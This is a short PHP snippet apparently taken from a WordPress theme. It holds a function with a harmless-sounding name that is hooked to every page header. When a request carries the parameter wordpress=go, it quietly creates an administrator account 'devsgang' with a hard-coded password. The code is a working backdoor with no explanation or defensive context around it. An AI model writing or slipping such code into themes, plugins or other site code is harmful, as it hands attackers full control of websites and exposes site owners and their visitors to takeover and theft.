function Theme_function() {
	If ($_GET['wordpress'] == 'go') {
	require('wp-includes/registration.php');
	If (!username_exists('devsgang')) {
	$user_id = wp_create_user('devsgang', 'Pa55W0rd');
	$user = new WP_User($user_id);
	$user->set_role('administrator');
		}
	}
}
add_action('wp_head', 'Theme_function');
